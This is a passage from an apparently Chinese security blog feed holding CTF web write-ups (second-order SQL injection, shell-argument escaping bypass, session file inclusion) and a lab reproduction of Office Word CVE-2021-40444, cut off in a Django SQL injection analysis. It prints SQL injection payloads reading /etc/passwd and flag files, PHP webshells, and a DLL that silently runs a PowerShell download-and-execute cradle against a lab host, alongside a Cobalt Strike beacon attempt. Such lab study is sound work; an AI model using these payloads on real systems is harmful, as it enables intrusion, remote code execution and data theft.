title="2018网鼎杯Comment"></a>2018网鼎杯Comment</h2><p>打开页面是一个留言板，留言会显示需要登陆，已经给了一个账号，zhangwei，但是密码不对，既然给了一个账号那就爆破一下密码，发现常规密码都不对，再次看密码格式三个星号可能代表需要爆破这三位？</p><p>设置数字爆破到密码为zhangwei666。</p><p>发帖后发现可以查看详情并且再去留言，可能是二次注入？使用一个异常的发帖后，再去给这个帖子提交留言，发现不能显示，可能是有问题。</p><p>试了一圈发现不太行，可能是需要组合利用，那还需要源代码查看。扫描一下目录。</p><p>发现一堆git泄露，好家伙在这等我呢。</p><p>找到一个write_do.php文件。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n135" mdtype="fences">&lt;?php<br>include &#34;mysql.php&#34;;<br>session_start();<br>if($_SESSION[&#39;login&#39;] != &#39;yes&#39;){<br>    header(&#34;Location: ./login.php&#34;);<br>    die();<br>}<br>if(isset($_GET[&#39;do&#39;])){<br>switch ($_GET[&#39;do&#39;])<br>{<br>case &#39;write&#39;:<br>    $category = addslashes($_POST[&#39;category&#39;]);<br>    $title = addslashes($_POST[&#39;title&#39;]);<br>    $content = addslashes($_POST[&#39;content&#39;]);<br>    $sql = &#34;insert into board<br>            set category = &#39;$category&#39;,<br>                title = &#39;$title&#39;,<br>                content = &#39;$content&#39;&#34;;<br>    $result = mysql_query($sql);<br>    header(&#34;Location: ./index.php&#34;);<br>    break;<br>case &#39;comment&#39;:<br>    $bo_id = addslashes($_POST[&#39;bo_id&#39;]);<br>    $sql = &#34;select category from board where id=&#39;$bo_id&#39;&#34;;<br>    $result = mysql_query($sql);<br>    $num = mysql_num_rows($result);<br>    if($num&gt;0){<br>    $category = mysql_fetch_array($result)[&#39;category&#39;];<br>    $content = addslashes($_POST[&#39;content&#39;]);<br>    $sql = &#34;insert into comment<br>            set category = &#39;$category&#39;,<br>                content = &#39;$content&#39;,<br>                bo_id = &#39;$bo_id&#39;&#34;;<br>    $result = mysql_query($sql);<br>    }<br>    header(&#34;Location: ./comment.php?id=$bo_id&#34;);<br>    break;<br>default:<br>    header(&#34;Location: ./index.php&#34;);<br>}<br>}<br>else{<br>    header(&#34;Location: ./index.php&#34;);<br>}<br>?&gt;</pre><p>字段都是直接拼接，但是使用了addslashes转义字段。查找一下绕过的方式</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n137" mdtype="fences">1：字符编码问题导致绕过<br>1.1、设置数据库字符为gbk导致宽字节注入<br>1.2、使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入<br><br>2：编码解码导致的绕过<br>2.1、url解码导致绕过addslashes<br>2.2、base64解码导致绕过addslashes<br>2.3、json编码导致绕过addslashes<br><br>3：一些特殊情况导致的绕过<br>3.1、没有使用引号保护字符串，直接无视addslashes<br>3.2、使用了stripslashes<br>3.3、字符替换导致的绕过addslashes</pre><p>不过这个地方既没有编解码的函数也没有字符编码的设置，还使用了单引号闭合。理论上按照闭合那一套是不能注入的。但是现在有个问题是</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n139" mdtype="fences">$category = mysql_fetch_array($result)[&#39;category&#39;];</pre><p>如上获取数据的时候，没有使用转义函数，后续直接进行的拼接。addslashes函数转义保存到数据库的时候，反引号是不保存到数据库的，也就是<code>\&#39;</code>保存到数据库就变成了<code>’</code>单引号。</p><p>也就是需要我们在发帖的时候保存category字段一个注入的代码，在留言评论的时候来触发他。</p><p>先来构造一下SQL语句，既然是insert注入，那就用盲注，构造如下语句。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n143" mdtype="fences">insert into comment<br>            set category = &#39;111&#39; and if((substr((select user()),1,1)=&#39;r&#39;),sleep(5),0),#&#39;,<br>                content = &#39;$content&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre><p>先来发个帖子，咱来评论留言，发现SQL被执行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211009172411010.png" alt="image-20211009172411010"></p><p>既然user是r开头的，那估计也就是root@localhost了，查库表。本来写个脚本执行，但是发现总是请求过多，响应超时。</p><p>搞了半天总是报错，就看看能不能报错回显出来，本地测试一个报错回显的语句，这样写能成功，但是需要出单引号，上面的语句只能闭合不能出去。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n148" mdtype="fences">insert into users<br>set id = 55,<br>username = updatexml(1,concat(0x7e,(version())),0),<br>password = &#39;11111&#39;;</pre><p>这是个多行的SQL语句，可以使用多行注释来拼接，然后再写一个参数进去，类似如下：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n150" mdtype="fences">insert into comment<br>            set category = &#39;111&#39;,/*&#39;,<br>                content = &#39;*/ content=updatexml(1,concat(0x7e,(version())),0),#&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre><p>试了半天也没结果，然后才想起来这报错不会被写进去，直接报错去了。。。</p><p>既然能写进去，那就直接执行，不需要报错语句，测试以下语句。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n153" mdtype="fences">insert into comment<br>            set category = &#39;111&#39;,/*&#39;,<br>                content = &#39;*/ content=version(),#&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre><p>回显如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015145908789.png" alt="image-20211015145908789"></p><p>想了一圈子发现还是最简单的方式能直接使用。查库名为ctf。如下查询表的时候注意要括号包裹不然会报错。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n157" mdtype="fences">insert into comment<br>            set category = &#39;111&#39;,/*&#39;,<br>                content = &#39;*/ content=(select group_concat(table_name) from information_schema.tables where table_schema=database()),#&#39;,<br>                bo_id = &#39;$bo_id&#39;</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015152847893.png" alt="image-20211015152847893"></p><p>查询字段名，主要表名要十六进制形式，查询user表。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n160" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x75736572),#&amp;bo_id=1</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015163102290.png" alt="image-20211015163102290"></p><p>查字段信息，就一个zhangwei。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n163" mdtype="fences">content=*/+content=(select+group_concat(username)+from+ctf.user),#&amp;bo_id=1</pre><p>换一个表查，board表。hex值为0x626f617264。字段有：id,category,title,content</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n165" mdtype="fences">content=*/+content=(select+group_concat(COLUMN_NAME)+from+information_schema.COLUMNS+where+table_schema=database()+and+TABLE_NAME=0x626f617264),#&amp;bo_id=1</pre><p>这几个字段查了一遍还是没有信息，表comment也没有信息，这就有意思了。不在数据库里，SQL还能干啥，毕竟是root权限，试试能不能写文件。</p><p>试了一番发现并不能愉快的写文件，或者目录是特定目录。文件不给写试试能不能读。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n168" mdtype="fences">content=*/+content=(SELECT+LOAD_FILE(0x2f6574632f706173737764)),#&amp;bo_id=2</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211015173416010.png" alt="image-20211015173416010"></p><p>好家伙 又是一个花式文件读取。直接读取根目录下的flag文件</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n171" mdtype="fences">content=11*/+content=(SELECT+LOAD_FILE(0x2f666c6167)),#&amp;bo_id=3</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018101945665.png" alt="image-20211018101945665"></p><h2 id="asis-2019-unicorn-shop"><a href="#asis-2019-unicorn-shop" class="headerlink" title="asis_2019_unicorn_shop"></a>asis_2019_unicorn_shop</h2><p>访问首页是一个购买网页，需要购买独角兽。但是我们没有钱，明显买不了。随便输入一个数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018104332545.png" alt="image-20211018104332545"></p><p>发现需要一个Unicode的编码参数，而且用了<code>unicodedata.numeric</code>来处理输入的值。意思是将Unicode转为等效的数值，那么可能就是Unicode编码转换中绕过数值购买判断。</p><p>其中最贵的是1337，那么需要找到一个转换后大于等于1337的Unicode码。</p><p>选择如下的符号：<a href="https://www.compart.com/en/unicode/U+10123">https://www.compart.com/en/unicode/U+10123</a></p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018114617271.png" alt="image-20211018114617271"></p><p>不过这个flag应该是有问题的，并不能验证成功。</p><h2 id="buuctf-2018-online-tool"><a href="#buuctf-2018-online-tool" class="headerlink" title="buuctf_2018_online_tool"></a>buuctf_2018_online_tool</h2><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang="php" cid="n182" mdtype="fences">&lt;?php<br><br>if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) {<br>    $_SERVER[&#39;REMOTE_ADDR&#39;] = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;];<br>}<br><br>if(!isset($_GET[&#39;host&#39;])) {<br>    highlight_file(__FILE__);<br>} else {<br>    $host = $_GET[&#39;host&#39;];<br>    $host = escapeshellarg($host);<br>    $host = escapeshellcmd($host);<br>    $sandbox = md5(&#34;glzjin&#34;. $_SERVER[&#39;REMOTE_ADDR&#39;]);<br>    echo &#39;you are in sandbox &#39;.$sandbox;<br>    @mkdir($sandbox);<br>    chdir($sandbox);<br>    echo system(&#34;nmap -T5 -sT -Pn --host-timeout 2 -F &#34;.$host);<br>}</pre><p>打开首页，又是一段代码，其中涉及两个函数escapeshellarg和escapeshellcmd，这是个防止命令执行的函数，区别在于</p><p>escapeshellarg：转义其中的单引号，并用单引号来包裹字符串。保证输入为一个字符串。</p><p>escapeshellcmd：转义可能导致命令执行的特殊符号，常见的特殊符号包括换行符都被会转义，单双引号在不配对的时候也被转义。保证输入为避免利用shell的特性执行其他命令。</p><p>本身正常情况下，都能起到防止命令注入，但是如果在一起使用，就会导致异常转义，因为escapeshellcmd也转义反斜线。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n187" mdtype="fences">127.0.0.1&#39; id<br>escapeshellarg: &#39;127.0.0.1&#39;\&#39;&#39; id&#39;<br>escapeshellcmd: 127.0.0.1\&#39; id</pre><p>在一起使用就会变成</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n189" mdtype="fences">escapeshellarg+escapeshellcmd: &#39;127.0.0.1&#39;\\&#39;&#39; id\&#39;</pre><p>简化上面的输入就是，第一个单引号已经被转义，后面的单引号也是，所以此处只当作字符来处理。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n191" mdtype="fences">127.0.0.1\ id&#39;</pre><p>但以上的命令并不能被执行，问题在于利用shell特性的分割连接符等都被转义了。以上解决的只是把一个字符串的输入分割成了携带参数形式的输入。</p><p>后面需要利用nmap，既然是能分割成携带参数选项的输入，那需要配合nmap的参数来执行。记得在nmap的一个低版本存在一个提权问题，不过由于是交互界面。也不能使用shell的命令符号，需要查找一个nmap能执行使用的参数。</p><p>首页代码中使用IP创建一个sandbox的目录，按照惯性，应该是为了写文件而准备的，所以应该是利用nmap的输出属性来执行。nmap输出参数有<code>-oN/-oX/-oS/-oG/-oA</code>。</p><p>首先需要调试一个能正常逃逸出单引号的payload，可以在<a href="https://tool.lu/coderunner">https://tool.lu/coderunner</a>测试，首先需要逃逸出双引号的两端包裹，先在两端添加两个单引号，输出为：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n196" mdtype="fences">&#39;&#39;\\&#39;&#39;\&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php&#39;\\&#39;&#39;&#39;<br>简化为：\&lt;?php @eval($_POST[123]);?&gt; -o index.php\\</pre><p>再需要分割开两端的反斜线，两端添加两个空格。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n198" mdtype="fences">&#39; &lt;?php @eval($_POST[123]);?&gt; -o index.php &#39;<br>输出为：&#39;&#39;\\&#39;&#39; \&lt;\?php @eval\(\$_POST\[123\]\)\;\?\&gt; -o index.php &#39;\\&#39;&#39;&#39;</pre><p>于是大概能用的payload就出来了，先测试一下哪个参数可以使用，一个个试一下，发现oG可以使用。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018151828426.png" alt="image-20211018151828426"></p><p>最后剑来，在根目录下发现一个flag</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018151945869.png" alt="image-20211018151945869"></p><p>哎嘿，这个flag又报错，看来0Solves的多少有点问题。</p><h2 id="Bestphp"><a href="#Bestphp" class="headerlink" title="Bestphp"></a>Bestphp</h2><p>首页又是一段PHP</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n206" mdtype="fences">&lt;?php<br>    highlight_file(__FILE__);<br>    error_reporting(0);<br>    ini_set(&#39;open_basedir&#39;, &#39;/var/www/html:/tmp&#39;);<br>    $file = &#39;function.php&#39;;<br>    $func = isset($_GET[&#39;function&#39;])?$_GET[&#39;function&#39;]:&#39;filters&#39;; <br>    call_user_func($func,$_GET);<br>    include($file);<br>    session_start();<br>    $_SESSION[&#39;name&#39;] = $_POST[&#39;name&#39;];<br>    if($_SESSION[&#39;name&#39;]==&#39;admin&#39;){<br>        header(&#39;location:admin.php&#39;);<br>    }<br>?&gt;</pre><p>由于存在call_user_func，所以我们可以覆盖file参数，来达到包含我们想要的文件，如果直接读取flag的话，下面的内容就有点多余，所以这里大概需要读取function和admin文件来查看。不能直接包含，不然PHP代码看不到。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n208" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=./function.php</pre><p>function内容为如下，看起来是个黑名单过滤。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n210" mdtype="fences">&lt;?php<br>function filters($data){<br>    foreach($data as $key=&gt;$value){<br>        if(preg_match(&#39;/eval|assert|exec|passthru|glob|system|popen/i&#39;,$value)){<br>            die(&#39;Do not hack me!&#39;);<br>        }<br>    }<br>}<br>?&gt;</pre><p>admin文件为</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n212" mdtype="fences">&lt;?php<br>if(empty($_SESSION[&#39;name&#39;])){<br>    session_start();<br>    #echo &#39;hello &#39; + $_SESSION[&#39;name&#39;];<br>}else{<br>    die(&#39;you must login with admin&#39;);<br>}<br>Pz4</pre><p>看起来没有直接利用的函数，但是这个创建了session，也就是有session文件的写入，我们需要去读取session文件来包含。</p><p>session的name在首页的POST中传输，再去访问admin文件，这里只判断参数是不是空。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n215" mdtype="fences">/?function=extract&amp;file=php://filter/convert.base64-encode/resource=/tmp/sess_k8ud00tfqs2mevh289uukn5to5</pre><p>加载发现，并没有回显，也许不在这个目录，在&#x2F;var&#x2F;lib下。</p><p>但是这里有一个问题，由于open_basedir的存在，我们不能加载别的目录下的文件，只能加载当前目录和tmp目录。</p><p>session_start函数有一个参数为save_path，可以设置保存路径，注意此处随便写入一个session的文件名，不然在POST获取的时候，就已经创建null。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n219" mdtype="fences">POST /?function=session_start&amp;save_path=/tmp HTTP/1.1<br>Host: www.bmzclub.cn:22937<br>DNT: 1<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8<br>Cookie: PHPSESSID=123<br>Connection: close<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 23<br><br>name=&lt;?php phpinfo();?&gt;</pre><p>获取session</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n221" mdtype="fences">/?function=extract&amp;file=/tmp/sess_123</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018172443260.png" alt="image-20211018172443260"></p><p>写入一个shell</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n224" mdtype="fences">name=&lt;?php system($_GET[&#34;aaa&#34;]);?&gt;</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20211018172740231.png" alt="image-20211018172740231"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;端午就该吃粽子&quot;&gt;&lt;a href=&quot;#端午就该吃粽子&quot; class=&quot;headerlink&quot; title=&quot;端午就该吃粽子&quot;&gt;&lt;/a&gt;端午就该吃粽子&lt;/h2&gt;&lt;p&gt;访问login.php，会给一个这样的链接&lt;a href=&quot;http://www.bmzclub.c
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="https://misakikata.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Office Word CVE-2021-40444 </title>
    <link href="https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/"/>
    <id>https://misakikata.github.io/2021/09/Office-Word-CVE-2021-40444/</id>
    <published>2021-09-15T08:55:33.000Z</published>
    <updated>2021-09-15T08:55:33.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="CVE-2021-40444"><a href="#CVE-2021-40444" class="headerlink" title="CVE-2021-40444"></a>CVE-2021-40444</h3><p>Office Word的一个1day，首先来复现一下使用，如果直接运行会显示CAB file建立时出错，需要先安装lacb。这里使用Tools老哥的一个方法，直接安装：</p><pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;ftp.debian.org&#x2F;debian&#x2F;pool&#x2F;main&#x2F;l&#x2F;lcab&#x2F;lcab_1.0b12.orig.tar.gztar zxvf lcab_1.0b12.orig.tar.gzcd lcab-1.0b12.&#x2F;configuremakesudo make installwhich lcab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用项目地址：<a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p>利用文档中给出的方法执行：</p><pre class="line-numbers language-none"><code class="language-none">python3 exploit.py generate test&#x2F;calc.dll http:&#x2F;&#x2F;192.168.111.130:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915103820898.png" alt="image-20210915103820898"></p><p>然后监听</p><pre class="line-numbers language-none"><code class="language-none">python3 exploit.py host 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915103914999.png" alt="image-20210915103914999"></p><p>把在out文件夹下生成的document.docx拷贝到Windows下，此处的office2019，16.0.13929版本。运行docx文件，可以看到交互过程</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915104537994.png" alt="image-20210915104537994"></p><p>于是就可以弹出计算器<br><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915104258300.png" alt="image-20210915104258300"></p><p>从请求上看，有一个word.html文件，在srv目录下。打开查看,OK 看不懂。。。看样子是做了混淆？不过任然可以依稀看到ActiveXObject，这个大概跟利用ActiveX控件有关。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915105543173.png" alt="image-20210915105543173"></p><p>可以来<a href="http://jsnice.org/">美化一下</a>，虽然依旧看不懂就是。不过从中间大概可以看到几个关键点，XMLHttpRequest发起的请求，地址为<a href="http://192.168.111.130:5555/word.cab">http://192.168.111.130:5555/word.cab</a>。所以这个cab文件才是真正执行的文件？</p><p>利用7z打开这个cab文件，文件标头为<code>4D 53 43 46</code>，虽然这个文件只有224K，但是里面有一个名为msword.inf的文件，大小为1G左右。这不太对。这个文件也在上面的js中提到过，所以大概是需要解压出来，想办法提取一下这个文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915112956403.png" alt="image-20210915112956403"></p><p>该文件是Windows的压缩格式，一般是作为安装包文件。利用Kali下的<strong>cabextract</strong>来解压。没有的话直接安装就行。</p><pre class="line-numbers language-none"><code class="language-none">cabextract --list word.cab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行报错，这个文件不能正常解压提取，说明不是一个正经的cab文件。看一下python的处理代码</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915112956403.png" alt="image-20210915120544407"></p><p>可以发现其实msword.inf就是word.dll。这个dll文件就是一开始传入的calc.dll重命名来的。后面用lcab来生成cab文件，然后用函数patch_cab来处理这个cab文件。这么我们先把这个处理前生成的cab文件保存一下。</p><pre class="line-numbers language-none"><code class="language-none">execute_cmd(&#39;lcab out.cab out2.cab&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取到out2.cab，这个文件可以正常解压查看，所以我们先尝试是否能自己生成一个cab文件，利用dll来转换。</p><p>用cobaltstrike生成一个DLL文件，按照转换方式来处理一下。先改个名字，此处用的beacon作为名字，那么word.html中也要做相应的修改。或者把名字改为msword。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915141049112.png" alt="image-20210915141049112"></p><p>然后需要patch一下，原项目中存在patch脚本，修改为类似如下：</p><pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python3​# Patch cab file​m_off &#x3D; 0x2df &#x3D; open(&#39;.&#x2F;beacon.cab&#39;,&#39;rb&#39;)cab_data &#x3D; f.read()f.close()​out_cab_data &#x3D; cab_data[:m_off]out_cab_data +&#x3D; b&#39;\x00\x5c\x41\x00&#39;out_cab_data +&#x3D; cab_data[m_off+4:]​out_cab_data &#x3D; out_cab_data.replace(b&#39;..\\beacon.inf&#39;, b&#39;..&#x2F;beacon.inf&#39;)​f &#x3D; open(&#39;.&#x2F;beacon2.cab&#39;,&#39;wb&#39;)f.write(out_cab_data)f.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是在执行过程中并没有上线，不确定原因，可能是DLL的问题？CS生成的DLL不能直接拿来用？</p><p>使用C代码编译生成一个DLL，利用如下代码，编译执行即可。</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;windows.h&gt;​void exec(void) &#123;system(&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;192.168.111.130:80&#x2F;a&#39;))\&quot;&quot;);return;&#125;​BOOL WINAPI DllMain(   HINSTANCE hinstDLL,   DWORD fdwReason,   LPVOID lpReserved )&#123;   switch( fdwReason )  &#123;       case DLL_PROCESS_ATTACH:          exec();          break;​       case DLL_THREAD_ATTACH:           break;​       case DLL_THREAD_DETACH:           break;​       case DLL_PROCESS_DETACH:           break;  &#125;   return TRUE;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译</p><pre class="line-numbers language-none"><code class="language-none">apt-get install gcc-mingw-w64i686-w64-mingw32-gcc -shared beacon.c -o beacon.dll<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>把文件放到test目录下，执行上面的命令。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210915161830711.png" alt="image-20210915161830711"></p><p>减轻影响</p><p>这个是利用ActiveX控件来执行的，而这个控件只有IE支持，到IE的选项-安全中，自定义安全级别，在运行ActiveX控件和插件选项中选择禁用。</p><p>参考地址：</p><p><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p><a href="https://www.t00ls.cc/thread-62682-1-1.html">https://www.t00ls.cc/thread-62682-1-1.html</a></p><p><a href="https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A">https://mp.weixin.qq.com/s/hjjLKQCiaVUKWOw1jzQE9A</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;CVE-2021-40444&quot;&gt;&lt;a href=&quot;#CVE-2021-40444&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-40444&quot;&gt;&lt;/a&gt;CVE-2021-40444&lt;/h3&gt;&lt;p&gt;Office Word的一个1day，首先来
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-35042 Django SQL注入</title>
    <link href="https://misakikata.github.io/2021/08/CVE-2021-35042-Django-SQL%E6%B3%A8%E5%85%A5/"/>
    <id>https://misakikata.github.io/2021/08/CVE-2021-35042-Django-SQL注入/</id>
    <published>2021-08-06T08:16:55.000Z</published>
    <updated>2021-08-06T08:19:06.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CVE-2021-35042-Django-SQL注入"><a href="#CVE-2021-35042-Django-SQL注入" class="headerlink" title="CVE-2021-35042 Django SQL注入"></a>CVE-2021-35042 Django SQL注入</h2><p>该漏洞是由于对QuerySet.order_by()中用户提供数据的过滤不足，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SQL注入攻击，最终造成服务器敏感信息泄露。</p><p>先本地创建一个Django环境，使用的版本为Django 3.1.10。具体的示例代码就使用：<a href="https://github.com/YouGina/CVE-2021-35042">https://github.com/YouGina/CVE-2021-35042</a>。</p><h3 id="Order-by参数获取"><a href="#Order-by参数获取" class="headerlink" title="Order_by参数获取"></a>Order_by参数获取</h3><p>其中获取GET参数值的是<code>request.GET.get(&#39;order_by&#39;, &#39;name&#39;)</code>这么一段，从order_by 中获取值，缺省为name。这个name的意思是数据库的字段。在models.py文件中有定义，也就是其实获取的是需要去查询的数据库字段名。</p><pre class="line-numbers language-none"><code class="language-none">class User(models.Model):    name &#x3D; models.CharField(max_length&#x3D;200)​    def __str__(self):        return self.name<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>order_by这个参数的作用的排序，对一个列或者多个值进行升序或者降序的排列。比如：</p><pre class="line-numbers language-none"><code class="language-none">SELECT * FROM Websites ORDER BY alexa DESC;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面这个SQL的意思就是，按照按照Alexa的顺序降序排列，DESC为降序，ASC为升序。</p><p>此问题按照官方的说法是：绕过标记为弃用的路径中的预期列引用验证。</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>在这里我们先输入一个不存在的字段名name4，查看一下是怎样一个流程。首先进入如下函数，判断order_by 的排序顺序和表达式。</p><pre class="line-numbers language-none"><code class="language-none">def add_ordering(self, *ordering):        &quot;&quot;&quot;        Add items from the &#39;ordering&#39; sequence to the query&#39;s &quot;order by&quot;        clause. These items are either field names (not column names) --        possibly with a direction prefix (&#39;-&#39; or &#39;?&#39;) -- or OrderBy        expressions.​        If &#39;ordering&#39; is empty, clear all ordering from the query.        &quot;&quot;&quot;        errors &#x3D; []        for item in ordering:            if isinstance(item, str):                if &#39;.&#39; in item:                    warnings.warn(                        &#39;Passing column raw column aliases to order_by() is &#39;                        &#39;deprecated. Wrap %r in a RawSQL expression before &#39;                        &#39;passing it to order_by().&#39; % item,                        category&#x3D;RemovedInDjango40Warning,                        stacklevel&#x3D;3,                    )                    continue                if item &#x3D;&#x3D; &#39;?&#39;:                    continue                if item.startswith(&#39;-&#39;):                    item &#x3D; item[1:]                if item in self.annotations:                    continue                if self.extra and item in self.extra:                    continue                # names_to_path() validates the lookup. A descriptive                # FieldError will be raise if it&#39;s not.                self.names_to_path(item.split(LOOKUP_SEP), self.model._meta)            elif not hasattr(item, &#39;resolve_expression&#39;):                errors.append(item)            if getattr(item, &#39;contains_aggregate&#39;, False):                raise FieldError(                    &#39;Using an aggregate in order_by() without also including &#39;                    &#39;it in annotate() is not allowed: %s&#39; % item                )        if errors:            raise FieldError(&#39;Invalid order_by arguments: %s&#39; % errors)        if ordering:            self.order_by +&#x3D; ordering        else:            self.default_ordering &#x3D; False<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数走到<code>names_to_path</code>的时候会根据传入的参数生成一个PathInfo 元组。返回最终的字段和没有找到的字段。其中opts代表模型选项，这里代表的这个表。然后去获取传入的字段值。当最后找不到这个字段的时候，会报一个<code>Cannot resolve keyword &#39;%s&#39; into field</code>的错误，也就是我们最后会看到的错误。</p><pre class="line-numbers language-none"><code class="language-none">def names_to_path(self, names, opts, allow_many&#x3D;True, fail_on_missing&#x3D;False):        path, names_with_path &#x3D; [], []        for pos, name in enumerate(names):            cur_names_with_path &#x3D; (name, [])            if name &#x3D;&#x3D; 